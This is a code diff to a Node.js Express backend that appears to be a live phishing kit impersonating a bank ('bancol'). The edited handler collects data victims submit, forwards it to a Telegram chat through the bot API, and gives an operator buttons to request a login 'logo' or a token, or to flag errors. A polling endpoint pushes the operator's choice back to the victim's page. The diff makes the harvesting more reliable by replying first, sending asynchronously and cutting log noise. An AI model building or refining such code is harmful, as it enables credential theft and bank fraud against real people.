@@ -15,17 +15,19 @@ app.use(bodyParser.json());
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(session({
     secret: process.env.SESSION_SECRET || 'bancol_secret_key_123',
-    resave: true,
-    saveUninitialized: true,
+    resave: false,
+    saveUninitialized: false,
     cookie: {
         secure: false,
         maxAge: 24 * 60 * 60 * 1000 // 24 hours
     }
 }));
 
-// Log all requests to debug session stability
+// Log only important requests
 app.use((req, res, next) => {
-    console.log(`[${req.method}] ${req.url} - SID: ${req.sessionID}`);
+    if (req.url.includes('/api/') && !req.url.includes('/api/check-action')) {
+        console.log(`[${req.method}] ${req.url} - SID: ${req.sessionID}`);
+    }
     next();
 });
 
@@ -95,47 +97,53 @@ app.post('/api/send-message', async (req, res) => {
     // Accumulate data in session
     Object.assign(req.session, data);
 
-    const message = formatSessionData(req.session);
-    const sessionId = req.sessionID;
+    // Respond immediately to client
+    res.json({ success: true });
 
-    const buttons = {
-        inline_keyboard: [
-            [
-                { text: '❌ Error Documento', callback_data: `error_documento:${sessionId}` },
-                { text: '✅ Pedir Logo', callback_data: `pedir_logo:${sessionId}` }
-            ],
-            [
-                { text: '❌ Error Logo', callback_data: `error_logo:${sessionId}` },
-                { text: '🔑 Pedir Token', callback_data: `pedir_token:${sessionId}` }
-            ],
-            [
-                { text: '❌ Error Token', callback_data: `error_token:${sessionId}` },
-                { text: '🏁 Finalizar', callback_data: `finalizar:${sessionId}` }
+    // Save session and send to Telegram asynchronously
+    req.session.save(async (err) => {
+        if (err) {
+            console.error('Session Save Error:', err);
+            return;
+        }
+
+        const message = formatSessionData(req.session);
+        const sessionId = req.sessionID;
+
+        const buttons = {
+            inline_keyboard: [
+                [
+                    { text: '❌ Error Documento', callback_data: `error_documento:${sessionId}` },
+                    { text: '✅ Pedir Logo', callback_data: `pedir_logo:${sessionId}` }
+                ],
+                [
+                    { text: '❌ Error Logo', callback_data: `error_logo:${sessionId}` },
+                    { text: '🔑 Pedir Token', callback_data: `pedir_token:${sessionId}` }
+                ],
+                [
+                    { text: '❌ Error Token', callback_data: `error_token:${sessionId}` },
+                    { text: '🏁 Finalizar', callback_data: `finalizar:${sessionId}` }
+                ]
             ]
-        ]
-    };
+        };
 
-    try {
-        const url = `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`;
-        await fetch(url, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: process.env.TELEGRAM_CHAT_ID,
-                text: message,
-                parse_mode: 'HTML',
-                reply_markup: buttons
-            })
-        });
-
-        req.session.save((err) => {
-            if (err) console.error('Session Save Error:', err);
-            res.json({ success: true });
-        });
-    } catch (error) {
-        console.error('Telegram Error:', error);
-        res.status(500).json({ success: false });
-    }
+        try {
+            const url = `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`;
+            await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: process.env.TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML',
+                    reply_markup: buttons
+                })
+            });
+            console.log(`[✅ TELEGRAM] Mensaje enviado para SID: ${sessionId}`);
+        } catch (error) {
+            console.error('Telegram Error:', error);
+        }
+    });
 });
 
 // Polling and handling for Telegram
@@ -197,9 +205,8 @@ app.get('/api/check-action', (req, res) => {
     const sessionId = req.sessionID;
     const action = global.pendingActions ? global.pendingActions[sessionId] : null;
 
-    // Log only if there's an action or every 10 polls to avoid spam
     if (action) {
-        console.log(`[POLL SUCCESS] Action: ${action} | Session: ${sessionId}`);
+        console.log(`[✅ ACTION] ${action} | SID: ${sessionId}`);
         delete global.pendingActions[sessionId];
     }
 
